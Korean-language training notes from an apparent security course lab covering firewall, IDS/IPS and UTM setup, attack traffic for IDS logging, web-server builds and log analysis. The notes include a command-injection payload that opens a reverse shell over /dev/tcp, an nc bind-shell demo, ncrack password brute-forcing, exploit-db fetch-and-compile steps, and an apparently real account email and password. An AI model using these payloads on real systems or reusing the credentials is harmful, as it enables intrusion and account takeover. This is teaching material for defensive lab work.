# 이벤트 대응

### UTM
* 방화벽 + IDS/IPS + VPN + WEB filter 등
    - untangle
        + 내부 직원망 위주(DMZ 서버망 X)
    - astaro(sophos)
        + client/server, 지사 많은 경우 등 기능이 많음
    - pfsense
        + 다양한 기능리 많이 있음
    - 안랩 등...

### 보안 솔루션 종류
1. 방화벽
	- packet filtering (IP/port)
	- stateful inspection
        + 내부에서 나간 포트는 외부에서 다시 들어올 때 포트 허용
    - Generator 방화벽(3세대)
        + 콘텐츠, 사용자별 설정
    - 외부로부터 내부를 보호함
    - 단점
        + ip/port를 속이는 경우 허용이 될 수 있음
        + 내부 공격은 차단 못함
        + 우회하게 되면 차단 못함
        + 어플리케이션 데이터를 차단하지 못함(바이러스)

2. IDS/IPS 침입탐지/방지 시스템
    - 사전에 정의된 률과 트래픽의 비교를 통해 보안 위협을 찾아냄.
    - ids : out of path방식 구현, 탐지-> 소극적대응(알람)
    - ips : inline 방식 구현, 적극적 대응(차단)

3. Anti-DDoS 
    - 분산서비스 거부 공격 방어 솔루션

4. 웹방화벽 Web Application Firewall (WAF)
    - 웹서비스에 대한 보안정책으로 웹공격 방어솔루션

5. EMS 
6. RMS
    - 취약점 관리
7. NAC(Network Access Control)
    - 직원 PC(End Point) 관리
    - 모니터링
8. PMS(Package Managment System)
    - 폐쇄망 업데이트 패치
    - 내부 시스템이 PMS를 통해서 패치/업데이트를 수행
    - 내부시스템이 인터넷 X

#### ESM, TMS, RMS의 차이
* 참고 : Terminology/ESM, TMS, RMS의 차이.txt
* RMS
    - 위험 관리 시스템
    - 자산을 확인 후, DB화
---

### untangle.com
* package download & 설치시 계정 필요함.
    - soyoung.lim2009@gmail.com / qwer1234

#### untangle
    - 첫번째 NIC : NAT 또는 vmnet8  192.168.10.x/24(dhcp)
    - 두번째 NIC : VMNET1  192.168.1.5/24
    - 세번째 NIC : VMNET2  192.168.2.5/24

* untangle 설정
    - 설치 app : firewall, captive portal, report, insrection prevention(IPS)

#### WIN7 NIC 설정(user/P@ssw0rd)
    - vmnet1로 연결 -> 부팅 -> dhcp 
    - untangle로부터 192.168.1.50~99 할당받는지 확인


#### untangle 세번째 NIC 설정
	이름 : servers_in
	static ip : 192.168.2.5/24
	DHCP설정 여부는 자유

* centos : NIC - vmnet2 연결
	- ip 수동 : 192.168.2.10 /24
	- gateway : 192.168.2.5
	- dns : 192.168.10.2 또는 8.8.8.8

* centos -> gw 2.5 ping test
	- 인터넷 되는지 확인 , (NAT)

## nat를 통해 외부로 통신할 때
* 시퀸스 넘버를 구분해, win7, centos를 구분해 외부와 통신 가능

### centos 웹서비스, ssh서비스 활성화
```
rpm -qa httpd
rpm -qa opensshd
service httpd status
service httpd start
service sshd status
service sshd start
```

### Topology 모습
```
 INTERNAL------------FW----------EXTERNAL(INTERNAL)
 (WIN7)		  |
		  |
		SERVERS_IN
		(CENTOS)

현재 WIN7 -> CENTOS   WEB, SSH 서비스 가능.
```

### 테스트
```
정책1 
   사내망 192.168.1.0/24 직원 -> 사내서버망 웹서버 192.168.2.10 로
  웹서비스 (80, 443)만 허용하고
   그외의 서비스 거부하는 정책
정책2
    사내망 192.168.1.0/24 -> 사내서버망 192.168.2.0/24
    ssh 서비스를 거부 함.
    단, 서버 담당자 (WIN7)만 SSH 서비스 허용
	(IP, HOSTNAME 기준으로 담당자 허용가능)
정책3
   사내서버망 192.168.2.0/24 직원 -> 사내직원망 192.168.1.0/24에    접근 거부

* 사내망 192.168.1.0/24 과 사내서버망 192.168.2.0/24은 인터넷은 되어야 함.
```
* 정책이 여러항목일 경우, 우선순위가 중요함. (RULE ID)
    - 첫번째 정책을 조건과 비교하고 맞으면 ACTION.
    - 조건이 맞지않으면 아래 RULE ID로 내려가서 조건과 비교하고 맞으면 그에 대한 ACITION. 

### VPN(Virtual Private Network)
* 가상사설망
    
- 가짜로 사설망처럼 사용 -> 사실은 공인망을 사설망처럼 사용함 -> 암호화
    
* 구성방식
    - P2P(또는 Site to Site)
    ```
		      공인망
	(N) 본사---------ISP----------지사(N)
	     VPN peer	         VPN peer
    ```
    - Remote Access
    ```
	      공인망
	(N) 본사---------ISP-----------재택근무
	 VPN server		Client
    ```
* 프로토콜 
    - L2TP, PPTP
        + 거의 사용하지 않음
    - IPsec (IP를 포함해서 암호화, ESP, AH)
        + 터널링
        + 단점 : 사용자
    - SSL VPN
        - 사용자 인증 가능

---
## IDS
* 정규표현식 확인
    - https://regexr.com/

#### snort : https://www.snort.org/
#### suricata : https://suricata-ids.org
* suricata rule
    - 구 사이트 : https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Rules
    - 새 사이트 : https://suricata.readthedocs.io/en/latest/rules/index.html


### 외부에서 내부로 접근 테스트
```
untangle 첫번째 NIC -> nat나 (vmnet8)로 변경
 192.168.10.x (dhcp)
kali를 NAT로 연결

    vmnet1	vmnet8
     win7--------fw-----------kali
	<-----------------
```

### 원래 안되야 정상이지만 호스트로 접근됨
* 라우팅 설정함
```
kali 
 route add -net  [network/prefix] gw [gateway_ip]
 win7이 포함된 네트워크 : 192.168.1.0/24
 gateway ip = untangle fw external ip 192.168.10.128

# route add -net 192.168.1.0/24 gw 192.168.10.128
# route
	확인
# ping 192.168.1.x (win7)
```

### 내/외부 접근 테스트
```
1) bind_tcp  : nc.exe
 server/client

  internal			external
  victim---------fw--------------attacker
  server		<-	client

@win7
cmd> nc.exe -lvp 80

@kali
# nc 192.168.1.75 80

2) reverse_tcp
 server/client

  internal			external
  victim---------fw--------------attacker
  client		->	server
			(port open : listen)
```
* IDS에서 탐지 -> 차단  : IPS
    - 차단된 이벤트의 SID를 확인
        + 2018392 (cmd 출력 내용을 확인해 차단)
        + 2210041
        + 2210051


## utm : untangle , pfsense
1) untangle : 네트워크구성 및 ids/ips
2) 웹서비스 (APM) 구성, 웹진단(zap) ->로그 발생
```
금요일 : 2번 예정
노트북
자료 : 구글공유
 준비 : vmware, 웹서버OS vm, kali vm
 (목요일까지 준비 -> 금요일 수업)
```

#### 08/27(금요일) 수업 공유 링크
* c11.kr/multicampusweblogs

### IDS/IPS
* 대상에 따라서
    - HIDS/HIPS :hosted, 탐지 대상이 호스트 server의 로그, 파일, 프로세스
        + EX) OSSEC
    - NIDS/NIPS : 네트워크 트래픽에 대한 탐지
        + EX) Snort, suricata
* untangle : snort -> cisco, suricata
    - 패턴 매칭을 이용한 룰 기반 -> 시그니처
    - pcre 정규표현식 지원
* 오탐(False Positive)
    - 오탐의 원인
        + 패틴 매칭의 한계
        + 공격의 발생 원리나, 발생하는 트래픽의 특성을 제대로 반영하지 않는 룰
        -> 좋은 룰을 만들어야함.
        + 트래깃이 불규칙성, 문자 특성
* IDS rules : 오용행위 기반 탐지
    - 룰 : 사전에 기록된 공격 패턴

```
	원격
공격자 - master - agent - target
	         - agent -
          - master - agent -
	         - agent -
```
---
port number
 - 잘알려진 포트 0 ~1023
 - 잘 알려지지않는 포트 1024 ~ 65535

### 현재
* https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml
* Port numbers are assigned in various ways, based on three ranges: 
    - System Ports (0-1023), 
    - User Ports (1024-49151), and the 
    - Dynamic and/or Private Ports (49152-65535); 

* PC환경: etherent  L2 마다 data MTU최대전송단위
    - ethernet MTU : 1500byte (tcp, IP포함)

```
cmd> ping x.x.x.x
  icmp data size

cmd> ping 70.12.113.1 -l 3000 -n 1

  icmp data size 32byte+ICMP 8byte+IP 20byte=60

  [icmp data 3000byte+ICMP 8byte] 단편화 +IP <=1500

 전체	3008byte

	data 1472    +ICMP8	+ IP 20
	data 1480    + IP 20
	data 48      + IP 20	
```
```
http 응답 메시지를 발송 size 클 경우
	첫번째 data
	두번째 data
	...
	마지막 data + HTTP header
```
---
### 설정
```
Internal - Servers_in 차단 했던 방화벽 정책 비활성화
Internal - Servers_in IP통신을 허용

Kali를 NAT -> VMNET1 또는 VMNET2로 변경
 -> 스캔 -> 와이어샤크 트래픽 확인, 로그

   
  kali 1.99 ----- fw-10.133------------------gw 10.2
  win7 1.75----   |
	         |
	       2.10
	      centos
```

## 공격 트래픽을 발생하여 확인해보자
### 1. scaning
툴 : nmap
```
@kali (192.168.1.99)
#nmap -v -sn 192.168.1.0/24  (live scan)
#nmap -v -A 192.168.1.75 (port scan)
#nmap -v -sn 192.168.2.0/24
#nmap -v -A 192.168.2.10
```
* 패킷 캡쳐, report - ips  - all event에서 로그확인
```
2010939  5432 PostageSQL scan
2010937  3306 Mysql scan
2010936  1521 Oracle SQL scan
2010935  1443 MSSQL scan
2002910  2800-2850 VNC scan
2002911  2900-2920 VNC scan
2003068  ssh scan outbound
```

### 2. kali -> centos   ssh 암호크랙
@kali  
`# ncrack -v --user root localhost:22`  
`# ncrack -v --user test localhost:22`  
* (세그먼트 오류시 업데이트 하기)  
    `# apt-get install ncrack`  
	    + y 설치
		+ D 디폴트

`# vim pass.txt`   
    - 많이 사용하는 암호 목록  
	```
    passwd
	dkagh1.
	dkagh2.
	P@ssw0rd
	qwer1234
	computer
	security
	passwd!
    ```  
`# ncrack -v --user root -P pass.txt 192.168.2.10:22`  

* 패킷캡쳐, ips 로그 확인
	- 2001219
	- 2003068
* @centos
    - 로그인 실패 로그

### 3. arpspoofing 
kali : vmnet1
win7 : vmnet1
```
  	win7	kali	gw(fw)
	1.75	1.99	1.5

win7에게 gw ip(1.5) -  kali mac를 전달
	arp table     1.5 =kali

gw(fw)에게 win7 ip(1.75) - kali mac를 전달
	arp talbe	    1.75 =kali
```
* 패킷 캡쳐, ips event 확인

---
## 아파치 웹서버 로그 확인
* 웹서버(victim준비)
	- APM설치 (PHP73, Mariadb, httpd)
	- phpmyadmin 설치

* kali가 웹서버 공격하여 로그 발생(zap)
* log확인

### 윈도우 로그
* IIS 웹서버 로그 확인

1. 웹서버 설정
```
@centos
NIC 1개만 사용 : NAT(또는 vmnet8)
부팅
admin (암호 dkagh1.)

고정 IP할당 192.168.10.50/24	gateway : 192.168.10.2  	dns : 192.168.10.2

$ ping 192.168.10.2
$ nslookup www.naver.com
$ sudo yum -y update
```

#### APM
* apache + PHP + MariaDB(Mysql)
* phpmyadmin 4.9.5 -> 최소사양확인 필수
	- https://docs.phpmyadmin.net/_/downloads/en/release_4_9_5/pdf/
* mariadb 설치10.4

```
# vi /etc/yum.repos.d/MariaDB.repo
 
#추가
[mariadb]
name = MariaDB
baseurl = http://yum.mariadb.org/10.4/centos7-amd64
gpgkey = https://yum.mariadb.org/RPM-GPG-KEY-MariaDB
gpgcheck = 1

$ sudo yum repolist
$ sudo  yum  install -y MariaDB
$ sudo systemctl enable mariadb
$ sudo systemctl start mariadb
$ sudo /usr/bin/mariadb-secure-installation (보안설정하는 스크립트)
	초기 root 암호 없음  엔터
	root 암호 변경 > 2번입력  
	anonymus사용자를 삭제 할것인지 n
	root 원격접속 여부  : y
	test이름의 데이터베이스를 삭제 할것인지. 	y n 
	저장여부 y

$ sudo mysql -u root  -p 
	암호 입력

mysql>  show databases;
mysql> exit
y
```
2. httpd (웹서버 설치)
```
$ sudo yum install -y httpd
```


3. php설치 (php73)
```
$ sudo yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm
$ sudo yum install -y yum-utils
$ sudo yum-config-manager --disable remi-php54
$ sudo yum-config-manager --enable remi-php73

$ sudo yum install php73
$ sudo yum install php73-php.x86_64  php-cli-7.3.8-1.el7.remi.x86_64 php73-scldevel.x86_64 php73-php-xml.x86_64   php73-php-xmlrpc.x86_64   php73-php-soap.x86_64 php73-php-process.x86_64 \
php73-php-pgsql.x86_64  php73-php-pdo.x86_64  php73-php-opcache.x86_64 php73-php-odbc.x86_64   \
php73-php-mysqlnd.x86_64 php73-php-mbstring.x86_64 php73-php-ldap.x86_64  \
php73-php-ldap.x86_64  php73-php-json.x86_64  php73-php-ioncube-loader.x86_64 \
php73-php-intl.x86_64  php73-php-gmp.x86_64 php73-php-gd.x86_64  php73-php-fpm.x86_64 \
php73-php-devel.x86_64  php73-php-dba.x86_64  php73-php-common.x86_64 \
php73-php-cli.x86_64  php73-php-bcmath.x86_64  php73-php-pecl-zip.x86_64 \
php73-php-phpiredis.x86_64  php73-php-pecl-imagick* php73-php-pecl-igbinary.x86_64 \
php73-php-pecl-igbinary-devel.x86_64 php73-php-pecl-geoip.x86_64 php73-php-pecl-xdebug.x86_64


$ sudo ls /etc/opt/remi/php73/php.ini
922 date.timezone = “Asia/Seoul”


FastCGI Process Manager (FPM) 동작


$ sudo systemctl start php73-php-fpm
( 패키지없는 경우 설치)

$ sudo systemctl start httpd
$ sudo systemctl enable httpd

웹브라우저에서 test 페이지 확인  (apache)
php확인
$ sudo vim /var/www/html/info.php
	<?php  phpinfo(); ?>
웹브라우저로 확인 http://localhost/info.php
```

3. 방화벽 설정 및 웹 관련 설정
```
$ sudo firewall-cmd --permanent --zone=public --add-service=http 
$ sudo firewall-cmd --permanent --zone=public --add-service=https
$ sudo firewall-cmd --reload

$ wget -P /usr/local/src https://files.phpmyadmin.net/phpMyAdmin/4.9.5/phpMyAdmin-4.9.5-all-languages.zip

$ sudo cd /usr/local/src
$ sudo unzip phpMyAdmin-4.9.5-all-languages.zip
$ sudo mv /usr/local/src/phpMyAdmin-4.9.5-all-languages /usr/share/phpMyAdmin  (디렉토리이름변경함께 이동. phpMyAdmin 아래에 바로 index.php 등 파일이 있어야함.)

도메인네임(IP) / phpmyadmin 입력시  /usr/share/phpMyAdmin 연결되도록 설정

$ sudo vim /etc/httpd/conf.d/phpMyAdmin.conf
===========================================
Alias /phpMyAdmin /usr/share/phpMyAdmin

<Directory /usr/share/phpMyAdmin/>
    Require all granted
</Directory>
===========================================

---------------------------------------------
보안설정 ; 
<Directory /usr/share/phpMyAdmin/>
    Require all denied
    Require ip 192.168.0.1  
</Directory>
---------------------------------------------
conf 파일 확인
$ sudo apachectl configtest
$ sudo systemctl restart httpd

웹브라우저로 접근해보기.

victim 준비 완료

centos 내에서  http://192.168.10.50 또는 http://localhost 입력시 웹페이지 확인
 http://localhost/phpMyAdmin 하고 나와야합니다.
```


4. 공격하여 로그 남기기
* attacker (kali)  NIC - NAT 연결
	- root 암호 toor
	- 부팅 후, zap 실행  -> 업데이트 

kali web----proxy(zap)----------------------------------------------centos
	      8080
* zap 실행 (프락시)
	- 브라우저 proxy설정 loalhost 8080
	- 브라우저에서 접속 공격대상에 접속
	- 웹브라우저로 방문한 사이트가 목록에 뜸.
		+ 브라우저 내에 proxy 설정 필요(localhost:8080)
	- 사이트 목록에서 http://192.168.10.50 선택 -> 공격 클릭
* 수동으로 sql injection, xss, csrf, 다운로드, 업로드… 직접 해도 됩니다.

5. 로그 확인하기
* centos 웹서버 로그를 windows로 빼기 (메일 발송 가능)
* apache log viewer로 로그 보기.  
	- 툴 : ApacheLogsViewer.exe

```
apache logs viewer
https://www.apacheviewer.com/download/
현재 버전 5.60

메뉴얼
https://www.apacheviewer.com/httpLogsViewer_Help.pdf
```

* 침해시스템 (centos) /var/log/httpd/access_log, error_log -> win10으로 전달


그외 취약한 웹소스 (오픈 소스 )  
 1) bWAPP
  https://sourceforge.net/projects/bwapp/
 2) OWASP broken Web Application Project
https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project
 3) DVWA
 http://www.dvwa.co.uk


### IIS 웹서버 로그
* log parser  (파일명 : LogParser.msi (설치) - 구글 공유)		# CLI 환경
* log parser studio (GUI-sql)  파일명 : LPSV2.D2.zip		# 'log parser' 설치 필요

* 샘플 로그 (파일 명: W3SVC2.zip - 구글공유에 있음) 
	- 주의사항 : 압축 해제 시 C:\ 아래에 해주세요. 또는 경로에 한글이 있으면 안됨.


#### log parser studio에서 로그파일 불러오기(로그유형 인식 필수)

sql문
1) 시간순으로 404코드를 카운트하며 그룹화
```
select to_string(time,'hh:mm:ss'), count(*)
from [파일경로=한글안됨]\ex081011.log
where sc-status = 404
group by to_string(time, 'hh:mm:ss')
```

2) 시간순으로 500코드를 카운트하며 그룹화
```
select to_string(time,'hh:mm:ss'), count(*)
from [파일경로=한글안됨]\ex081011.log
where sc-status = 500
group by to_string(time, 'hh:mm:ss')
```
* 'group by to_string(time, 'hh:mm:ss')'
	- 선택한 컬럼과 count(*)를 그룹화
	
3) 시간순으로 모든 코드를 카운트하며 그룹화
```
select to_string(time,'hh:mm:ss'), sc-status, count(*)
from  [파일경로=한글안됨]\ex081011.log
group by to_string(time, 'hh:mm:ss'), sc-status
```

4) 카운트로 내림차순 정령하며, 일정 시간 구간의 404코드를 가진 ip를 그룹화
```
select c-ip, count(*)
 from [파일경로=한글안됨] \ex081011.log
where sc-status = 404
and to_string(time, 'hh:mm') >= '02:30'
and to_string(time, 'hh:mm') <= '07:00'
group by c-ip
order by count(*) desc
```
* 'order by count(*) desc'
	- 카운트 순으로 정렬(내림차순)
5) 카운트로 내림차순 정령하며, 일정 시간 구간의 404코드를 가진 파일이름을 그룹화
```
select extract_filename(cs-uri-stem), count(*)
 from [파일경로=한글안됨] \ex081011.log
where sc-status = 404
and to_string(time, 'hh:mm') >= '02:30'
and to_string(time, 'hh:mm') <= '07:00'
group by extract_filename(cs-uri-stem)
order by count(*) desc
```

---
# 프로젝트

## 공격을 탐지하는 IDS/IPS 구축
* 대쉬보드
	- barnyard(base), splunk(유로), elk

* 공격 유형
	- OSI 7계층 dos 공격
---
### OS Command Injection
* 웹 어플리케이션이 OS에서 사용하는 명령어를 쉘을 통해서 실행하는 경우, 이 명령어를 조작하여 공격하는 기법.
* 명령어 연결자
	- &, &&, |, ||, ;. `
* &
	- 앞의 명령어가 백그라운드로 실행되고 뒤의 명령어가 실행
	- 윈도우의 경우 앞명령어 실행하고 뒷명령어 실행
	- `& cat /etc/passwd`
* &&
	- 앞명령어가 성공하면 뒤명령어 실행
* |	
	- 앞명령어의 결과가 뒤명령어의 입력으로 반영되어 실행됨
* ;	
	- 앞명령어 실행하고 명령어 실행
* ||	
	- 앞의 명령어가 실패해도 뒤의 명령어가 실행됨
* `
	- 뒤명령어 우선 실행(리눅스)
	- Ex) 파라미터 `ls -al`

#### 공격 예시1
* nc -lvp 4444
* 127.0.0.1; /bin/sh 0</dev/tcp/192.168.10.50/4444 1>&0 2>&0

#### 추가 공격 예시1
```
https://www.exploit-db.com/raw/9542
cd /tmp
wget 공격코드
	- wget이 안되면 'cat << EOF >> test.c' 로 파일 복사 생성
	- 파일 내용 수정
		sed -i.bak 's/\/bin\/sh/\$0/' test.c
		sed -i.bak 's/,%esp\\n/\$4,%esp\\n/' test.c
		sed -i.bak 's/"$0"/"\/bin\/sh"/' test.c
gcc -o attack 공격코드
```


---
## 보안 솔류션 설치
* pdf 문서 참조

